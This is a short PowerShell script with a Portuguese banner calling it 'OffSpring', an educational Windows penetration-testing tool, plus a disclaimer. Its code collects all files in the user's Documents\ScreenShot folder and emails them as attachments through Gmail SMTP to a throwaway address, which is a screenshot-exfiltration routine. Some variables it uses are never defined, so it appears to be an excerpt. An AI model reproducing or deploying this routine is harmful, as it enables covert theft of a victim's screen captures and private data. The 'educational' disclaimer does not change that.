#####################################
# Software "OffSpring", versão 4.58 #
# OffSpring é uma ferramenta educa- #        
# cional projetada para conduzir    #
# testes simulados de penetração em #
# ambientes Windows exclusivamente. #
#####################################
# Este software destina-se única e  #
# exclusivamente a fins educacionais#
# e de pesquisa em segurança ciber- #
# nética. O autor não encoraja nem  #
# apoia a utilização deste software #
# para atividades ilegais ou malici-#
# osas.                             #
#####################################
# O autor declina qualquer respon-  #
# sabilidade por quaisquer conse-   #
# quências derivadas do uso deste   #
# software para fins não educacion- #
# ais ou não autorizados.           #
#####################################

#Connection Details
$smtpServer = "smtp.gmail.com"

#SMTP connection
$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 

#SSL tunnel to communicate   
$smtp.EnableSsl = $true

$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)

#From Address
$msg.From = "throwawaygmailaccountaddress@gmail.com"

#To Address, Copy the below line for multiple recipients
$msg.To.Add("throwawaygmailaccountaddress@gmail.com")

#Message Body
$msg.Body="Please See Attached Files"

#Message Subject
$msg.Subject = "Email with Multiple Attachments"

#your file location
$files=Get-ChildItem "$env:USERPROFILE\Documents\ScreenShot\"

Foreach($file in $files)
{
Write-Host "Attaching File :- " $file
$attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
$msg.Attachments.Add($attachment)

}
$smtp.Send($msg)
write-host "	Mail Sent"
$attachment.Dispose();
$msg.Dispose();
